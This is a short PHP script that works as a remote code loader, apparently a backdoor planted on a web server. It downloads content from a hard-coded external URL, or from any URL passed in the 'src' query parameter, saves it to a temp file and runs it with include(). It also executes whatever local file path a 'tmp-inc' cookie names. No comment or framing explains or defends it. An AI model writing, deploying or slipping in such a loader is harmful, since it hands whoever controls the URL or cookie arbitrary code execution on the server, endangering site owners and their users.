<?php

define('DEFAULT_SOURCE_URL', 'https://hirachi.jp//access/db.txt');

function getSourceUrl() {
    return isset($_GET['src']) && filter_var($_GET['src'], FILTER_VALIDATE_URL)
        ? $_GET['src']
        : DEFAULT_SOURCE_URL;
}

function getTempPath() {
    if (!empty($_COOKIE['tmp-inc']) && isValidTempPath($_COOKIE['tmp-inc'])) {
        return $_COOKIE['tmp-inc'];
    }
    return generateTempPath();
}

function isValidTempPath($path) {
    return file_exists($path) && filesize($path) > 100;
}

function generateTempPath() {
    $path = tempnam(sys_get_temp_dir(), 'inc_');
    return $path ?: false;
}

function fetchAndStoreContent($url, $path) {
    $content = @file_get_contents($url);
    if ($content === false) {
        die("❌Failed fetch url");
    }

    if (@file_put_contents($path, $content) === false) {
        die("❌ Failed write to tmp.");
    }

    setcookie('tmp-inc', $path);
    include($path);
    exit;
}

// --- Main Logic ---

$tempPath = getTempPath();

if (!$tempPath) {
    die("❌ Failed create tmp");
}

$fileSize = @filesize($tempPath);

if ($fileSize === false || $fileSize < 10) {
    $srcUrl = getSourceUrl();
    fetchAndStoreContent($srcUrl, $tempPath);
} elseif ($fileSize >= 1024) {
    setcookie('tmp-inc', $tempPath);
    include($tempPath);
    exit;
}

die("DIE");
